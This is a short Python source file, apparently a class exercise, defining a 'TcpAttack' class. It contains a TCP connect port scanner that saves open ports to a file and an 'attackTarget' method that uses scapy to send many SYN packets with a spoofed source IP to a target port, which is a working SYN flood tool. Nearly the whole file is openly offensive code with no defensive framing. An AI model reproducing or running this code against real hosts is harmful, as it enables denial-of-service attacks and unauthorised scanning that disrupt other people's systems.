from scapy.all import *
import socket

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, startPort, endPort):
        outFile = open("openPorts.txt", "w")

        verbosity = 0
        openPorts = []

        for port in range(startPort, endPort):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, port))
                openPorts.append(port)
                if verbosity:
                    print("Port " + str(port) + " is open")
                sys.stdout.write("")
                sys.stdout.flush()
            except:
                if verbosity:
                    print("Port " + str(port) + " is closed")
                sys.stdout.write("")
                sys.stdout.flush()
        for port in openPorts:
            outFile.write(str(port) + "\n")
        outFile.close()


    def attackTarget(self, port, numSyn):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        try:
            for i in range(numSyn):
                IP_header = IP(src=self.spoofIP, dst=self.targetIP)
                TCP_header =TCP(sport=RandShort(), dport=port, flags="S")
                packet = IP_header / TCP_header
                try:
                    send(packet)
                except Exception as e:
                    print(e)
        except:
            print("fail")
    
